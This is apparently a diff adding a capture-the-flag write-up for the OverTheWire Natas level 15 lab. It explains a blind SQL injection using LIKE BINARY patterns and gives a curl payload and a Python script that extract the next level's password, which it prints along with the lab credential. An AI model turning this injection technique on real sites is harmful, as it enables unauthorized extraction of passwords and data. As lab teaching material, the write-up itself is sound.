@@ -1,0 +1,71 @@
+In this lab you are introduced to a simple form where it prompts you for a
+username and you click a button "Check existence". When you submit the form you
+are told whether or not the user exists. But the code only checks if the number
+of selected rows is greater than one. You can use this to your advantage if you
+combine it with sql injection since there is no input validation again. By this
+I mean you enter a username that you know doesn't exist and add an OR clause
+with a LIKE operator to check for a pattern in the password. If your OR clause
+is ever true then the webpage will tell you that the user exists.
+
+The only way that I could see to crack this is with brute force. Which would be
+a pain to do manually. I googled to make sure there was not a far better way to
+do this. I saw a blog post of one person who said that they used binary
+search. I wanted to come up with my own solution. It's not quite brute force. I
+used python to execute a series of curl commands. Using curl commands to insert
+form data will likely be useful for other labs and projects. Here is an example
+curl command that uses sql injection for this lab, to check if the letter a
+exists in the password for the user named natas16:
+
+curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -d 'username=" OR password LIKE
+BINARY "%a%' http://natas15.natas.labs.overthewire.org/index.php
+
+The first two arguments tell curl what username and password to use at the
+password popup screen that appears when you first visit the lab. The 3rd and 4th
+arguments tell curl what information to put into the form on the webpage. That
+BINARY function is necessary because without it your LIKE comparison is
+case-insensitive.
+
+Using the LIKE operator in your WHERE clause let's you search for similar items
+in a given field. It has very simple pattern matching, there are only two
+wildcards they are the percent symbol which represents 0 or more characters and
+underscore which represents a single character.
+
+The basic logic is to iterate through all alphanumeric characters for the 0th
+position through the 31st position. I know that the password will be
+alphanumeric because that has been the case for all previous labs. The following
+python program gave me the natas16 password. It executed the curl command 890
+times which took about 3 minutes on my computer. With pure brute force it would
+have taken 1984 curl commands. Certainly a binary search solution would have
+been more proper but why spend 5+ minutes optimizing something that will only
+take three minutes?
+
+import os
+import string
+
+request_count = 0
+chars = list(string.ascii_letters + string.digits)
+password = ""
+
+for i in range(32):
+    for char in chars:
+        print(f"{i} {char}")
+        guess = (i * "_") + char + ((32 - i - 1) * "_")
+        print(f"guess = {guess}")
+        command = "curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -d '"
+        command += f"username=\" OR password LIKE BINARY \"{guess}"
+        command += "' http://natas15.natas.labs.overthewire.org/index.php"
+        output = os.popen(command).read()
+        request_count += 1
+        print(f"current password = {password}")
+        if(output.find("This user exists.") > -1):
+            password += char
+            break
+        elif(output.find("This user doesn't exist.") > -1):
+            pass
+        else:
+            raise Exception("Unexpected output: {output}")
+	    
+print(f"Executed {request_count} requests.")
+print(f"Final Password = {password}")
+
+natas16 password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
